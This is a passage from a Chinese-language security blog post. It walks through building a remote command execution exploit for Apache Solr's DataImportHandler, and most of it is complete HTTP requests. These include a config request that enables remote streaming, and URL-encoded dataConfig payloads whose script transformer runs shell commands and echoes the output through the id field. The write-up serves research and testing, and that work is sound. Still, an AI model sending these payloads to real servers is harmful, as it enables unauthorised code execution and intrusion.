yywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191112180836.png" alt=""></p><p>我靠，简直一毛一样 XD</p><p>我感觉我要一血了，侧信道攻击真的牛批。然而正如上图，他喵的还是没回显啊…</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20191112115732.png" alt=""></p><p>Emmm….陷入沉思</p><h3 id="稍加思索"><a href="#稍加思索" class="headerlink" title="稍加思索"></a>稍加思索</h3><p>在 github 那个 repo 中我们可以发现其实<a href="https://www.cnblogs.com/sevck/p/11842811.html" target="_blank" rel="noopener">检测漏洞 - Exploit2</a>用的也是 @Longofo 师傅在那篇文章说的 ContentStreamSource</p><blockquote><p>​    在相关概念中说到了ContentStreamDataSource能接收Post数据作为数据源，结合第一阶段说到的dynamicField就能实现回显了。</p></blockquote><p>一开始不熟悉 java 的我看到这也很懵逼，怎么就能实现回显了…然后我们可以看看那个 github repo exp2，我也着实看了好久</p><p>在我用这个 exp2 的第四步，也就是开启远程流这个步骤，如果直接按照这个做法的话，是直接得到了 403 Forbidden</p><blockquote><p>​    该步骤是为了修改<code>configoverlay.json</code>文件中的配置 以启用远程流的相关选项 <code>.enableStreamBody</code> <code>.enableRemoteStreaming</code></p><p>替换<code>tika</code>为索引库名称</p><p></p><figure class="highlight yaml hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-string">POST</span> <span class="hljs-string">/solr/tika/config</span> <span class="hljs-string">HTTP/1.1</span></span><br><span class="line"><span class="hljs-attr">Host:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span></span><br><span class="line"><span class="hljs-attr">Accept:</span> <span class="hljs-string">*/*</span></span><br><span class="line"><span class="hljs-string">Content-type:application/json</span></span><br><span class="line"><span class="hljs-attr">Content-Length:</span> <span class="hljs-number">159</span></span><br><span class="line"><span class="hljs-attr">Connection:</span> <span class="hljs-string">close</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-string">{"set-property":</span> <span class="hljs-string">{"requestDispatcher.requestParsers.enableRemoteStreaming":</span> <span class="hljs-literal">true</span><span class="hljs-string">},</span> <span class="hljs-attr">"set-property":</span> <span class="hljs-string">{"requestDispatcher.requestParsers.enableStreamBody":</span> <span class="hljs-literal">true</span><span class="hljs-string">}}</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>响应200即成功(实际测试 8.1可以成功)</p><p>响应500即失败(实际测试 某些低版本会失败)</p></blockquote><p>所以我们不得不只能走另一种方式，不用开启 streambody 的方法。</p><p>然后开始了漫长的 fuzz 过程，可能我理解得比较慢，导致做的也比较慢，这里我们可以看到这个利用 streambody 构造的 POC </p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/solr/tika/dataimport?command=full-import&amp;verbose=false&amp;clean=false&amp;commit=false&amp;debug=true&amp;core=tika&amp;name=dataimport&amp;dataConfig=%0a%3c%64%61%74%61%43%6f%6e%66%69%67%3e%0a%3c%64%61%74%61%53%6f%75%72%63%65%20%6e%61%6d%65%3d%22%73%74%72%65%61%6d%73%72%63%22%20%74%79%70%65%3d%22%43%6f%6e%74%65%6e%74%53%74%72%65%61%6d%44%61%74%61%53%6f%75%72%63%65%22%20%6c%6f%67%67%65%72%4c%65%76%65%6c%3d%22%54%52%41%43%45%22%20%2f%3e%0a%0a%20%20%3c%73%63%72%69%70%74%3e%3c%21%5b%43%44%41%54%41%5b%0a%20%20%20%20%20%20%20%20%20%20%66%75%6e%63%74%69%6f%6e%20%70%6f%63%28%72%6f%77%29%7b%0a%20%76%61%72%20%62%75%66%52%65%61%64%65%72%20%3d%20%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%6e%65%77%20%6a%61%76%61%2e%69%6f%2e%49%6e%70%75%74%53%74%72%65%61%6d%52%65%61%64%65%72%28%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%69%66%63%6f%6e%66%69%67%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29%29%29%3b%0a%0a%76%61%72%20%72%65%73%75%6c%74%20%3d%20%5b%5d%3b%0a%0a%77%68%69%6c%65%28%74%72%75%65%29%20%7b%0a%76%61%72%20%6f%6e%65%6c%69%6e%65%20%3d%20%62%75%66%52%65%61%64%65%72%2e%72%65%61%64%4c%69%6e%65%28%29%3b%0a%72%65%73%75%6c%74%2e%70%75%73%68%28%20%6f%6e%65%6c%69%6e%65%20%29%3b%0a%69%66%28%21%6f%6e%65%6c%69%6e%65%29%20%62%72%65%61%6b%3b%0a%7d%0a%0a%72%6f%77%2e%70%75%74%28%22%74%69%74%6c%65%22%2c%72%65%73%75%6c%74%2e%6a%6f%69%6e%28%22%5c%6e%5c%72%22%29%29%3b%0a%72%65%74%75%72%6e%20%72%6f%77%3b%0a%0a%7d%0a%0a%5d%5d%3e%3c%2f%73%63%72%69%70%74%3e%0a%0a%3c%64%6f%63%75%6d%65%6e%74%3e%0a%20%20%20%20%3c%65%6e%74%69%74%79%0a%20%20%20%20%20%20%20%20%73%74%72%65%61%6d%3d%22%74%72%75%65%22%0a%20%20%20%20%20%20%20%20%6e%61%6d%65%3d%22%65%6e%74%69%74%79%31%22%0a%20%20%20%20%20%20%20%20%64%61%74%61%73%6f%75%72%63%65%3d%22%73%74%72%65%61%6d%73%72%63%31%22%0a%20%20%20%20%20%20%20%20%70%72%6f%63%65%73%73%6f%72%3d%22%58%50%61%74%68%45%6e%74%69%74%79%50%72%6f%63%65%73%73%6f%72%22%0a%20%20%20%20%20%20%20%20%72%6f%6f%74%45%6e%74%69%74%79%3d%22%74%72%75%65%22%0a%20%20%20%20%20%20%20%20%66%6f%72%45%61%63%68%3d%22%2f%52%44%46%2f%69%74%65%6d%22%0a%20%20%20%20%20%20%20%20%74%72%61%6e%73%66%6f%72%6d%65%72%3d%22%73%63%72%69%70%74%3a%70%6f%63%22%3e%0a%20%20%20%20%20%20%20%20%20%20%20%20%20%3c%66%69%65%6c%64%20%63%6f%6c%75%6d%6e%3d%22%74%69%74%6c%65%22%20%78%70%61%74%68%3d%22%2f%52%44%46%2f%69%74%65%6d%2f%74%69%74%6c%65%22%20%2f%3e%0a%20%20%20%20%3c%2f%65%6e%74%69%74%79%3e%0a%3c%2f%64%6f%63%75%6d%65%6e%74%3e%0a%3c%2f%64%61%74%61%43%6f%6e%66%69%67%3e%0a%20%20%20%20%0a%20%20%20%20%20%20%20%20%20%20%20</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: solr.com:8983</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:66.0) Gecko/20100101 Firefox/66.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: application/json, text/plain, */*</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Referer</span>: http://solr.com:8983/solr/</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 212</span><br><span class="line"><span class="hljs-attribute">content-type</span>: multipart/form-data; boundary=------------------------aceb88c2159f183f</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--------------------------aceb88c2159f183f</span><br><span class="line"><span class="hljs-attribute">Content-Disposition</span>: form-data; name="stream.body"</span><br><span class="line"></span><br><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line">&lt;RDF&gt;</span><br><span class="line">&lt;item/&gt;</span><br><span class="line">&lt;/RDF&gt;</span><br><span class="line"></span><br><span class="line">--------------------------aceb88c2159f183f--</span><br></pre></td></tr></tbody></table></figure><p></p><p>其中 urlencode 部分是：</p><p></p><figure class="highlight xml hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">dataConfig</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"streamsrc"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"ContentStreamDataSource"</span> <span class="hljs-attr">loggerLevel</span>=<span class="hljs-string">"TRACE"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>&lt;![CDATA[</span><br><span class="line"><span class="hljs-actionscript">          <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">poc</span><span class="hljs-params">(row)</span></span>{</span></span><br><span class="line"><span class="hljs-actionscript"> <span class="hljs-keyword">var</span> bufReader = <span class="hljs-keyword">new</span> java.io.BufferedReader(<span class="hljs-keyword">new</span> java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(<span class="hljs-string">"ifconfig"</span>).getInputStream()));</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript"><span class="hljs-keyword">var</span> result = [];</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript"><span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) {</span></span><br><span class="line"><span class="hljs-actionscript"><span class="hljs-keyword">var</span> oneline = bufReader.readLine();</span></span><br><span class="line">result.push( oneline );</span><br><span class="line"><span class="hljs-actionscript"><span class="hljs-keyword">if</span>(!oneline) <span class="hljs-keyword">break</span>;</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript">row.put(<span class="hljs-string">"title"</span>,result.join(<span class="hljs-string">"\n\r"</span>));</span></span><br><span class="line"><span class="hljs-actionscript"><span class="hljs-keyword">return</span> row;</span></span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">document</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">entity</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">stream</span>=<span class="hljs-string">"true"</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">name</span>=<span class="hljs-string">"entity1"</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">datasource</span>=<span class="hljs-string">"streamsrc1"</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">processor</span>=<span class="hljs-string">"XPathEntityProcessor"</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">rootEntity</span>=<span class="hljs-string">"true"</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">forEach</span>=<span class="hljs-string">"/RDF/item"</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">transformer</span>=<span class="hljs-string">"script:poc"</span>&gt;</span></span><br><span class="line">             <span class="hljs-tag">&lt;<span class="hljs-name">field</span> <span class="hljs-attr">column</span>=<span class="hljs-string">"title"</span> <span class="hljs-attr">xpath</span>=<span class="hljs-string">"/RDF/item/title"</span> /&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">entity</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">document</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">dataConfig</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>利用 ContentStreamDataSource 把 stream.body 作为数据源进行处理。其实看到这，再根据文章中所描述的：</p><blockquote><p>​    在相关概念中说到了ContentStreamDataSource能接收Post数据作为数据源，结合第一阶段说到的dynamicField就能实现回显了。</p></blockquote><p>其实我们的 POC 也呼之欲出了。</p><p>只要去掉 stream.body ，使用 POST XML 作为数据源，再配合 dynamicField 的特性，就可以把回显输出到 document 当中了。</p><p>于是我们可以大概这么去构造 dataConfig</p><p></p><figure class="highlight xml hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">dataConfig</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"streamsrc"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"ContentStreamDataSource"</span> <span class="hljs-attr">loggerLevel</span>=<span class="hljs-string">"TRACE"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>&lt;![CDATA[</span><br><span class="line"><span class="hljs-actionscript">          <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">poc</span><span class="hljs-params">(row)</span></span>{</span></span><br><span class="line"><span class="hljs-actionscript"> <span class="hljs-keyword">var</span> bufReader = <span class="hljs-keyword">new</span> java.io.BufferedReader(<span class="hljs-keyword">new</span> java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(<span class="hljs-string">"ls"</span>).getInputStream()));</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript"><span class="hljs-keyword">var</span> result = [];</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript"><span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>) {</span></span><br><span class="line"><span class="hljs-actionscript"><span class="hljs-keyword">var</span> oneline = bufReader.readLine();</span></span><br><span class="line">result.push( oneline );</span><br><span class="line"><span class="hljs-actionscript"><span class="hljs-keyword">if</span>(!oneline) <span class="hljs-keyword">break</span>;</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-actionscript">row.put(<span class="hljs-string">"id"</span>,result.join(<span class="hljs-string">"\n\r"</span>));</span></span><br><span class="line"><span class="hljs-actionscript"><span class="hljs-keyword">return</span> row;</span></span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">document</span>&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;<span class="hljs-name">entity</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">name</span>=<span class="hljs-string">"streamxml"</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">datasource</span>=<span class="hljs-string">"streamsrc1"</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">processor</span>=<span class="hljs-string">"XPathEntityProcessor"</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">forEach</span>=<span class="hljs-string">"/RDF/item"</span></span></span><br><span class="line"><span class="hljs-tag">        <span class="hljs-attr">transformer</span>=<span class="hljs-string">"script:poc"</span>&gt;</span></span><br><span class="line">            <span class="hljs-tag">&lt;<span class="hljs-name">field</span> <span class="hljs-attr">column</span>=<span class="hljs-string">"id"</span> <span class="hljs-attr">xpath</span>=<span class="hljs-string">"/RDF/item/id"</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"id_s"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"string"</span>/&gt;</span></span><br><span class="line">    <span class="hljs-tag">&lt;/<span class="hljs-name">entity</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">document</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">dataConfig</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>直接利用默认配置的 id fileld 进行回显，然后将之前 stream body 的改成 xml 发送 post 请求即可。</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/solr/test1/dataimport?command=full-import&amp;verbose=false&amp;clean=false&amp;commit=false&amp;debug=true&amp;core=test1&amp;name=dataimport&amp;dataConfig=%0A%3CdataConfig%3E%0A%3CdataSource%20name%3D%22streamsrc%22%20type%3D%22ContentStreamDataSource%22%20loggerLevel%3D%22TRACE%22%20%2F%3E%0A%0A%20%20%3Cscript%3E%3C!%5BCDATA%5B%0A%20%20%20%20%20%20%20%20%20%20function%20poc(row)%7B%0A%20var%20bufReader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec(%22ls%22).getInputStream()))%3B%0A%0Avar%20result%20%3D%20%5B%5D%3B%0A%0Awhile(true)%20%7B%0Avar%20oneline%20%3D%20bufReader.readLine()%3B%0Aresult.push(%20oneline%20)%3B%0Aif(!oneline)%20break%3B%0A%7D%0A%0Arow.put(%22id%22%2Cresult.join(%22%5Cn%5Cr%22))%3B%0Areturn%20row%3B%0A%0A%7D%0A%0A%5D%5D%3E%3C%2Fscript%3E%0A%0A%3Cdocument%3E%0A%20%20%20%20%3Centity%0A%20%20%20%20%20%20%20%20name%3D%22streamxml%22%0A%20%20%20%20%20%20%20%20datasource%3D%22streamsrc1%22%0A%20%20%20%20%20%20%20%20processor%3D%22XPathEntityProcessor%22%0A%20%20%20%20%20%20%20%20forEach%3D%22%2FRDF%2Fitem%22%0A%20%20%20%20%20%20%20%20transformer%3D%22script%3Apoc%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cfield%20column%3D%22id%22%20xpath%3D%22%2FRDF%2Fitem%2Fid%22%20name%3D%22id_s%22%20type%3D%22string%22%2F%3E%0A%20%20%20%20%3C%2Fentity%3E%0A%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E%0A%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: zedd.vv:8983</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:70.0) Gecko/20100101 Firefox/70.0</span><br><span class="line"><span class="hljs-attribute">Accept</span>: application/json, text/plain, */*</span><br><span class="line"><span class="hljs-attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="hljs-attribute">Content-Length</span>: 62</span><br><span class="line"><span class="hljs-attribute">Content-Type</span>: application/xml;charset=utf-8</span><br><span class="line"></span><br><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line">&lt;RDF&gt;</span><br><span class="line">&lt;item/&gt;</span><br><span class="line">&lt;/RDF&gt;</span><br></pre></td></tr></tbody></table></figure><p></p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" 